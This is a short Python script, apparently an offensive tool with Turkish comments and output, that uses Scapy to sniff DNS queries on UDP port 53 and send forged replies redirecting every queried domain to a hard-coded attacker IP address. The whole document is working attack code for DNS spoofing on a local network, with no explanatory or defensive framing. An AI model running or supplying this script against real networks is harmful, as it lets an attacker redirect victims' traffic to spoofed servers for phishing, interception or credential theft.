from scapy.all import *
import sys

spoofed_ip = "192.168.1.100"  # Saldırganın IP adresi

def dns_spoof(packet):
    if packet.haslayer(DNSQR) and packet[DNS].qr == 0:
        spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                      UDP(dport=packet[UDP].sport, sport=53) / \
                      DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                          an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=spoofed_ip))
        send(spoofed_pkt, verbose=False)
        print(f"[+] {packet[IP].src} için {packet[DNSQR].qname.decode()} sahte IP {spoofed_ip} ile yönlendirildi.")

print("[*] DNS spoofing dinleniyor...")
sniff(filter="udp port 53", prn=dns_spoof)
